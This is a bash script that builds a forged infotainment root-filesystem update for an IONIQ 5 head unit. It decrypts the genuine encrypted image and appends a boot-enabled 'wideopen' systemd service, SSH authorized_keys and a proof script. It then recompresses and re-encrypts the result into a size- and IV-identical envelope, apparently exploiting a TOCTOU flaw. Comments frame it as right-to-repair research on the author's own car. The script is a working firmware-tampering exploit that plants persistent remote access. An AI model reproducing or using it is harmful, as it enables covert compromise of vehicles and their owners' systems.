#!/bin/bash
# Build the patched mango-rootfs.tar.gz TE2 envelope for the owner's own IONIQ 5
# (decommissioned, off-road; right-to-repair research). Pipeline:
#   decrypt genuine envelope -> uncompressed tar -> append benign payload members ->
#   recompress with libdeflate L10 in concatenated gzip members (beats the OEM's ratio,
#   low memory) -> zero-pad plaintext to the genuine body size -> TE2-encrypt to an
#   envelope byte-size- and IV-identical to the genuine one (same FS extent, same decrypt
#   on the unit). Output: build/evil_rootfs.te2
#
# NOTE on compression: the OEM compressed tighter than `gzip -9` (gzip header XFL=0, a
# zlib/optimized encoder), so `gzip -9` recompression OVERSHOOTS the genuine body by ~114KB
# and won't fit the extent. libdeflate level 10 packs ~1.2% tighter than gzip -9 here, which
# clears it with ~18 MiB to spare. Requires the python `deflate` (libdeflate) module:
#   pip install --user --break-system-packages deflate
set -euo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"
# gen5w_decrypt.py (the TE2 decrypt tool) is vendored at pizero/gen5w_decrypt.py and reads
# the content key from $TE2_CONTENT_KEY / key.local. Override the path with $GEN5W_DECRYPT.
GEN5W="${GEN5W_DECRYPT:-$HERE/gen5w_decrypt.py}"
[ -f "$GEN5W" ] || GEN5W="$HERE/gen5w_decrypt.py"
[ -f "$GEN5W" ] || { echo "ERROR: gen5w_decrypt.py not found. Set GEN5W_DECRYPT=/path/to/gen5w_decrypt.py"; exit 1; }
BENIGN="${1:?usage: 01_make_evil_rootfs.sh /path/to/genuine/mango-rootfs.tar.gz [outdir]}"
OUT="${2:-$HERE/build}"; mkdir -p "$OUT"; W="$(mktemp -d)"
ENV_SIZE=$(stat -c%s "$BENIGN"); META=$((0x4024)); BODY=$((ENV_SIZE-META))
echo "[*] genuine envelope=$ENV_SIZE  plaintext(body)=$BODY"

echo "[*] decrypting genuine rootfs envelope -> plaintext tar.gz"
python3 "$GEN5W" decrypt "$BENIGN" "$W/genuine.tar.gz" --force >/dev/null
test "$(stat -c%s "$W/genuine.tar.gz")" -eq "$BODY"

echo "[*] decompressing to uncompressed tar"
zcat "$W/genuine.tar.gz" > "$W/evil.tar"

echo "[*] staging + appending benign payload members (./ prefix matches the genuine tar)"
ST="$W/staging"; mkdir -p "$ST/etc/systemd/system/multi-user.target.wants" "$ST/etc/wideopen"
install -m0644 "$HERE/payload/wideopen.service" "$ST/etc/systemd/system/wideopen.service"
ln -sf ../wideopen.service "$ST/etc/systemd/system/multi-user.target.wants/wideopen.service"
install -m0600 "$HERE/payload/authorized_keys" "$ST/etc/wideopen_authorized_keys"
install -m0755 "$HERE/payload/proof.sh" "$ST/etc/wideopen/proof.sh"

# T2 (visible UI): patch a deep, purely-cosmetic label — Settings > General > System Information >
# Modem Information — the hardcoded 'IMEI: ' row label. No functional field, no version/update
# logic touched. Patched across every trim variant present; last-wins on extraction.
QML_MEMBERS=""
for V in qml_eco3.0 qml_new2.0 qml_genesis; do
    REL="app/share/AppSetup/$V/general/systeminfo/Q_AppSettingSysInfoModemInformation.qml"
    SRC="$(tar --to-stdout -xf "$W/evil.tar" "./$REL" 2>/dev/null)"
    [ -n "$SRC" ] || continue
    mkdir -p "$ST/$(dirname "$REL")"
    printf '%s' "$SRC" | sed 's/text: "IMEI: "/text: "IMEI [TOCTOU-PoC]: "/' > "$ST/$REL"
    if grep -q 'TOCTOU-PoC' "$ST/$REL"; then echo "    patched $REL"; QML_MEMBERS="$QML_MEMBERS ./$REL";
    else echo "    [WARN] 'IMEI: ' label not found in $REL — skipped"; fi
done

( cd "$ST" && tar --owner=0 --group=0 --numeric-owner --no-recursion -rf "$W/evil.tar" \
    ./etc/systemd/system/wideopen.service \
    ./etc/systemd/system/multi-user.target.wants/wideopen.service \
    ./etc/wideopen_authorized_keys \
    ./etc/wideopen/proof.sh \
    $QML_MEMBERS )

echo "[*] recompressing with libdeflate L10 (concatenated gzip members, 64MB each)"
python3 "$HERE/chunkgz.py" "$W/evil.tar" "$W/evil.tar.gz" 10 67108864
EV=$(stat -c%s "$W/evil.tar.gz")
echo "[*] evil plaintext tar.gz=$EV  (must be <= $BODY; headroom=$((BODY-EV)))"
if [ "$EV" -gt "$BODY" ]; then echo "ERROR: still larger than genuine body; raise libdeflate level or trim payload"; exit 1; fi

echo "[*] zero-padding to exactly BODY (tar stops at the gzip EOF; trailing zeros ignored)"
cp "$W/evil.tar.gz" "$W/evil_padded"; truncate -s "$BODY" "$W/evil_padded"

echo "[*] TE2-encrypting to a size/IV-identical envelope (target basename mango-rootfs.tar.gz)"
python3 "$HERE/te2_encrypt.py" "$W/evil_padded" "$BENIGN" "$OUT/evil_rootfs.te2" "mango-rootfs.tar.gz"

echo "[*] round-trip verify: inspect + decrypt under the real basename, confirm payload"
VR="$W/vr"; mkdir -p "$VR"; cp "$OUT/evil_rootfs.te2" "$VR/mango-rootfs.tar.gz"
python3 "$GEN5W" inspect "$VR/mango-rootfs.tar.gz" | grep -E '"iv"|integrity_valid'
python3 "$GEN5W" decrypt "$VR/mango-rootfs.tar.gz" "$VR/out.tar.gz" --force >/dev/null
# extract the payload members + version.txt (last-wins check for the visible marker)
QML_CHK="app/share/AppSetup/qml_eco3.0/general/systeminfo/Q_AppSettingSysInfoModemInformation.qml"
zcat "$VR/out.tar.gz" 2>/dev/null | tar -C "$VR" -xf - \
    ./etc/systemd/system/wideopen.service ./etc/wideopen/proof.sh "./$QML_CHK" 2>/dev/null
test -f "$VR/etc/systemd/system/wideopen.service" && echo "[OK] wideopen.service present"
test -x "$VR/etc/wideopen/proof.sh" && echo "[OK] proof.sh present + executable"
grep -q 'TOCTOU-PoC' "$VR/$QML_CHK" 2>/dev/null \
    && echo "[OK] modem-info label marker wins on extraction ($(basename "$QML_CHK"))" \
    || echo "[WARN] QML marker not last-wins — check tar extract order on target"
echo "[DONE] $OUT/evil_rootfs.te2  size=$(stat -c%s "$OUT/evil_rootfs.te2") (== genuine $ENV_SIZE)"
rm -rf "$W"
